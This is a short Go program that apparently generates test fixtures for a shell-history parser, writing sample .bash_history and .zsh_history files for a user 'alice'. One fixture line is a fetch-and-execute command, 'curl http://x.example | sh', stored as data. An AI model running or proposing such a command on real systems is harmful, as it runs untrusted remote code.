//go:build ignore

// gen.go writes the goshell contract-test fixtures into argv[1].
package main

import (
	"os"
	"path/filepath"
)

func main() {
	d := filepath.Join(os.Args[1], "home/alice")
	os.MkdirAll(d, 0o755)
	os.WriteFile(filepath.Join(d, ".bash_history"),
		[]byte("ls -la\n#1767225600\ncurl http://x.example | sh\n"), 0o644)
	os.WriteFile(filepath.Join(d, ".zsh_history"),
		[]byte(": 1767225600:0;whoami\n"), 0o644)
}
